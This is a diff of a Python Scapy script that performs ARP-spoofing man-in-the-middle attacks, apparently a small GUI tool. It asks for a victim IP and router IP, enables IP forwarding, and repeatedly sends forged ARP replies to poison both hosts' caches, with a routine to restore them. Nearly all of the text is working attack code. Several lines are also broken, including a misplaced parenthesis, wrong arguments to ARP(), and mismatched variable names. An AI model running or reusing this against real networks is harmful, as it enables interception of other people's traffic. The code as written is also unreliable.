@@ -44,9 +44,9 @@ textRouterIP.grid(column=1, row=3)
 # MitM Section
 '''
 try:
-	interface = raw_input ("Enter Interface: ")
-	victimIP = raw_input ("Enter Victim IP: ")
-	gatewayIP = raw_input ("Enter Gateway IP: ")
+	textInterface = raw_input ("Enter Interface: ")
+	textVictimIP = raw_input ("Enter Victim IP: ")
+	textRouterIP = raw_input ("Enter Router IP: ")
 except KeyboardInterrupt:
 	print("\n[*] Exiting...")
 	sys.exit(1)
@@ -58,10 +58,10 @@ os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 # send ARP requests
 def get_mac(IP):
     conf.verb = 0
-    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP, timeout=2,
-                                                          intface=textInterface, inter=0.1))
+    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = IP, timeout = 2,
+    iface = textInterface, inter = 0.1)
     for snd, rcv in ans:
-        return rcv.sprintf(r"Ether.src%")
+        return rcv.sprintf(r"%Ether.src%")
 
 
 # restore ARP
@@ -69,8 +69,8 @@ def restoreARP():
     print("\n Restoring Target")
     victimMAC = get_mac(textVictimIP)
     gatewayMAC = get_mac(textRouterIP)
-    send(ARP(op=2, pdst=textRouterIP, psrc=textVictimIP, hwdst="ff:ff:ff:ff:ff:ff",
-             hwsrc=victimMac), count=7)
+    send(ARP(op = 2, pdst = textRouterIP, psrc = textVictimIP, hwdst = "ff:ff:ff:ff:ff:ff",
+             hwsrc = victimMac), count = 7)
     print("Disabling IP Forwarding")
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
     print("Exiting")
@@ -78,9 +78,9 @@ def restoreARP():
 
 
 # ARP reply, switch
-def switch(gatewMAC, victimMAC):
-    send(ARP(op=2, pdst=textVictimIP, psrc=textRouterIP, hwdst=victimMAC))
-    send(ARP(op=2, pdst=textRouterIP, psrc=textVictimIP, hwdst=gatewMAC))
+def switch(gatewMAC, vicMAC):
+    send(ARP(op = 2, pdst = textVictimIP, psrc = textRouterIP, hwdst = vicMAC))
+    send(ARP(op = 2, pdst = textRouterIP, psrc = textVictimIP, hwdst = gatewMAC))
 
 
 # MITM
@@ -106,7 +106,7 @@ def mitm():
             switch(gatewayMAC, victimMAC)
             time.sleep(1.5)
         except KeyboardInterrupt:
-            reARP()
+            restoreARP()
             break
 
 
